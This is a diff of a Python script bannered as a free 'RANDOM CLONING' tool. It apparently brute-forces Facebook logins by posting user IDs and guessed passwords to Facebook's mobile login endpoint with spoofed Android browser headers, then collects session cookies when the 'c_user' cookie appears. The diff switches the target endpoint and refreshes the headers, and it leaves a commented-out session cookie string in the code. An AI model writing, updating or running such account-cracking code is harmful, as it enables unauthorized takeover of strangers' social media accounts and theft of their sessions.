@@ -84,9 +84,9 @@ logo =("""\
 \033[1;37m[*] Github        : PRINCE HAJI
 \033[1;37m[*] Status        : FREE
 \033[1;37m[*] TEAM          : HAJI NAJEEB
-\033[1;37m[*] UPDATE BY     :HAJI_
+\033[1;37m[*] UPDATE BY     : HAJI_
 \033[1;37m[*] Tools  Name   : RANDOM CLONING
-\033[1;37m[*] version       : trial
+\033[1;37m[*] version       : 0.1
 \x1b[1;97m[*]----------------------------------------------
 [*]----------------------------------------------
    \033[1;97m  (Use AirPlaNe MooD For More SpEED) \033[1;97m
@@ -226,21 +226,27 @@ def free(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority':'free.facebook.com',
-            'method': 'POST',
-            'scheme': 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'max-age=0',
-            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
-            'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent':'Mozilla/5.0 (Linux; Android 11; RMX3241 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/345.0.0.34.118;]",'}
-            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
+            header_freefb = {'authority': 'p.facebook.com',
+           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+           'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+           'cache-control': 'max-age=0',
+         # 'cookie': 'datr=nT2_ZWKp_OLUyYeEqh-dcUex; sb=nT2_Zd_sHxoQWpvxoJd7WruJ; m_pixel_ratio=1.891728162765503; ps_l=0; ps_n=0; locale=en_GB; wl_cbv=v2%3Bclient_version%3A2403%3Btimestamp%3A1707032158; vpd=v1%3B985x486x1.891728162765503; wd=572x1159; fr=0R9Mu48MuELJoQRGl.AWVrV5AmqK5umu2LASulxEkUvCU.Blvz2d.Cf.AAA.0.0.Blvz9-.AWVXtUrBWPg',
+           'dpr': '2.2250001430511475',
+           'sec-ch-prefers-color-scheme': 'dark',
+           'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+           'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
+           'sec-ch-ua-mobile': '?1',
+           'sec-ch-ua-model': '"SOV43"',
+           'sec-ch-ua-platform': '"Android"',
+           'sec-ch-ua-platform-version': '"12.0.0"',
+           'sec-fetch-dest': 'document',
+           'sec-fetch-mode': 'navigate',
+           'sec-fetch-site': 'none',
+           'sec-fetch-user': '?1',
+           'upgrade-insecure-requests': '1',
+           'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+           'viewport-width': '980',}
+            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
